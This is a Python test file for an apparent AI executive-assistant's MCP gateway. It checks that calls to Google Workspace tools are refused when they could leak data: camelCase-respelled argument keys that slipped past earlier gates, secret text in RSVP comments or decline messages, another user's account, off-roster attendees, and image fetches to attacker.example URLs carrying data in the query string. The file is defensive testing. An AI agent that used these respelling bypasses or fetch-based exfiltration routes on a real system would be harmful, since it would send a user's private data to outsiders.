"""workspace-mcp 1.29.0's CamelCaseArgumentsMiddleware renames an undeclared
camelCase key to the declared snake_case parameter. A gate that matched the
exact key never saw `rsvpComment`, `Attendees` or `userGoogleEmail`, and the
server turned them into the real thing. Every gate now reads by normalized
spelling; these tests pin that, plus the refusals added with it (mailed text
on every tool, nested image / URL fetches, non-object arguments).

Mirrors the structure of test_mcp_gateway_email_egress.py.
"""
from __future__ import annotations

import asyncio
import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import openexecutive.audit
import openexecutive.orchestrator.mcp_gateway as gw_module
from openexecutive.orchestrator.mcp_gateway import MCPGateway
from openexecutive.people import store as people_store

EXEC_ADDR = "ceo@example.com"
ALICE = "alice@example.com"
STRANGER = "stranger@evil.example"
EVENT = "google_workspace__manage_event"


@pytest.fixture(autouse=True)
def isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    db_path = tmp_path / "people.db"
    monkeypatch.setattr(people_store, "DB_PATH", db_path)
    people_store.initialize_db()
    people_store.upsert_person(full_name="Alice", email=ALICE)
    monkeypatch.setattr(openexecutive.audit, "log_event", lambda *a, **k: None)


def _make_gateway() -> tuple[MCPGateway, AsyncMock]:
    gateway = MCPGateway()
    session = MagicMock()
    fake_result = MagicMock()
    fake_result.content = [MagicMock(text='{"ok": true}')]
    session.call_tool = AsyncMock(return_value=fake_result)
    gateway._session = session
    return gateway, session.call_tool


def _call(gateway: MCPGateway, tool_name: str, arguments: Any) -> str:
    settings = SimpleNamespace(exec_email_address=EXEC_ADDR, email_poll_interval_seconds=60)
    with patch.object(gw_module, "get_settings", return_value=settings):
        return asyncio.run(gateway.call_tool({"name": tool_name, "arguments": arguments}))


def _forwarded(session_call: AsyncMock) -> dict[str, Any]:
    return session_call.await_args.args[1]["arguments"]


# ---------------------------------------------------------------------------
# Text Google mails to someone the roster never checked
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["rsvp_comment", "rsvpComment", "RSVPComment", "Rsvp-Comment"])
def test_rsvp_comment_refused_in_any_spelling(key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, EVENT, {"action": "rsvp", "event_id": "e1",
                                    "response": "accepted", key: "the secret"})
    assert session_call.await_count == 0
    assert key in json.loads(result)["error"]


@pytest.mark.parametrize("tool", [
    "google_workspace__manage_out_of_office", "google_workspace__manage_focus_time",
])
@pytest.mark.parametrize("key", ["decline_message", "declineMessage"])
def test_decline_message_refused(tool: str, key: str) -> None:
    """An auto-decline is mailed to whoever invites the Executive in the window."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, {"action": "create", "start": "2026-10-01T09:00:00Z",
                                   "end": "2026-10-02T09:00:00Z", key: "the secret"})
    assert session_call.await_count == 0
    assert key in json.loads(result)["error"]


def test_out_of_office_without_message_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__manage_out_of_office",
          {"action": "create", "start": "2026-10-01T09:00:00Z", "end": "2026-10-02T09:00:00Z",
           "decline_message": None})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Acting account
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["userGoogleEmail", "UserGoogleEmail", "user-google-email"])
def test_other_account_refused_in_any_spelling(key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__search_gmail_messages",
                   {"query": "x", key: "victim@example.com"})
    assert session_call.await_count == 0
    assert "victim@example.com" in json.loads(result)["error"]


def test_exact_key_exec_plus_respelled_other_account_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__search_gmail_messages",
                   {"query": "x", "user_google_email": EXEC_ADDR,
                    "userGoogleEmail": "victim@example.com"})
    assert session_call.await_count == 0
    assert "victim@example.com" in json.loads(result)["error"]


def test_respelled_exec_address_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__search_gmail_messages",
          {"query": "x", "userGoogleEmail": EXEC_ADDR.upper()})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Calendar attendees and the notification pin
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["Attendees", "ATTENDEES", "attendees_"])
def test_off_roster_attendee_refused_in_any_spelling(key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, EVENT, {"action": "create", "summary": "s", key: [STRANGER]})
    assert session_call.await_count == 0
    assert STRANGER in json.loads(result)["error"]


def test_empty_exact_key_beside_respelled_stranger_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, EVENT, {"action": "create", "attendees": [],
                                    "Attendees": [{"email": STRANGER}]})
    assert session_call.await_count == 0
    assert STRANGER in json.loads(result)["error"]


def test_respelled_roster_attendee_passes_and_keeps_notifications() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, EVENT, {"action": "update", "event_id": "e1", "Attendees": [ALICE],
                           "send_updates": "all"})
    assert session_call.await_count == 1
    assert _forwarded(session_call)["send_updates"] == "all"


def test_respelled_send_updates_cannot_undo_the_pin() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, EVENT, {"action": "update", "event_id": "e1", "description": "d",
                           "sendUpdates": "all"})
    fwd = _forwarded(session_call)
    assert fwd["send_updates"] == "none"
    assert "sendUpdates" not in fwd


@pytest.mark.parametrize("action", ["Delete", " delete ", "RSVP"])
def test_action_matched_like_the_server(action: str) -> None:
    """A respelled delete/rsvp passes through the gate as the server treats it."""
    gateway, session_call = _make_gateway()
    _call(gateway, EVENT, {"action": action, "event_id": "e1"})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Nested fetches (Google-side)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tool,arguments", [
    ("google_workspace__insert_doc_image",
     {"document_id": "d", "index": 1, "image_source": "https://attacker.example/p.png?d=s"}),
    ("google_workspace__batch_update_presentation",
     {"presentation_id": "p", "requests": [{"createImage": {"url": "https://attacker.example/x"}}]}),
    ("google_workspace__batch_update_presentation",
     {"presentation_id": "p", "requests": [{"replaceAllShapesWithImage":
                                            {"imageUrl": "https://attacker.example/x"}}]}),
    ("google_workspace__batch_update_form",
     {"form_id": "f", "requests": [{"createItem": {"item": {"image":
                                                             {"sourceUri": "https://attacker.example/x"}}}}]}),
])
def test_nested_fetch_refused(tool: str, arguments: dict[str, Any]) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, arguments)
    assert session_call.await_count == 0
    assert "fetch" in json.loads(result)["error"]


def test_drive_file_id_image_source_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__insert_doc_image",
          {"document_id": "d", "index": 1, "image_source": "1AbCdEfDriveFileId"})
    assert session_call.await_count == 1


def test_hyperlink_in_doc_is_not_a_fetch() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__batch_update_doc",
          {"document_id": "d", "operations": [{"type": "insert_text", "text": "see",
                                               "link_url": "https://example.com"}]})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Argument shapes that must not skip the gates
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("arguments", ["[]", "null", '"{\\"a\\": 1}"', [], [1, 2], "42"])
def test_non_object_arguments_refused_for_workspace_tools(arguments: Any) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__get_events", arguments)
    assert session_call.await_count == 0
    assert "JSON object" in json.loads(result)["error"]


def test_apps_script_refused_whatever_the_arguments() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__run_script_function",
                   '"{\\"script_id\\": \\"x\\", \\"function_name\\": \\"f\\"}"')
    assert session_call.await_count == 0
    assert "Apps Script" in json.loads(result)["error"]


def test_other_servers_keep_their_arguments_as_is() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "notion__search", [1, 2])
    assert session_call.await_count == 1


def test_deeply_nested_attachments_refused_not_crashed() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__send_gmail_message",
                   {"to": ALICE, "subject": "s", "body": "b", "attachments": "[" * 100_000})
    assert session_call.await_count == 0
    assert "attachment" in json.loads(result)["error"].lower()
